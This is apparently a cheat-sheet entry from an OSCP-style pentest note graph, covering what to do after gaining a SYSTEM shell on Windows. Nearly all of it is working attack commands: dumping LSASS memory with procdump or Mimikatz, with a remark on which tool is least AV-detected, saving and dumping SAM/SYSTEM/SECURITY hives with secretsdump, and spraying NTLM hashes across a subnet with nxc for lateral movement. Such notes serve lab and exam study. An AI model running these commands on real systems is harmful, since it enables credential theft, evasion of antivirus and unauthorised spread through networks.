---
id: system-shell
title: SYSTEM Shell / Proof (Windows)
stage: objective
tags: [windows]
tools:
  - type C:\Users\Administrator\Desktop\root.txt
  - impacket-secretsdump $DOMAIN/user:password@$TARGET
leads_to:
  - pass-the-hash
  - domain-admin
  - pivot
---

## Grab Proof

```powershell
type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\proof.txt    # OSCP format
hostname && whoami
```

## Dump LSASS (for credentials)

```powershell
# Procdump (least AV-detected)
.\procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp

# Task Manager (GUI — no tools needed)
# Task Manager → Details → right-click lsass.exe → "Create dump file"

# Mimikatz (on box)
privilege::debug
sekurlsa::logonpasswords
```

```bash
# Parse dump on attacker
pypykatz lsa minidump lsass.dmp
```

## Dump SAM (local hashes)

```cmd
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY
```

```bash
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

## Spray Hashes Across Subnet

```bash
nxc smb 192.168.x.0/24 -u Administrator -H $NTLM --local-auth
nxc smb 192.168.x.0/24 -u Administrator -H $NTLM
```

## Check for Additional Networks

```powershell
ipconfig /all
route print
arp -a
netstat -ano    # internal listeners → pivot
```
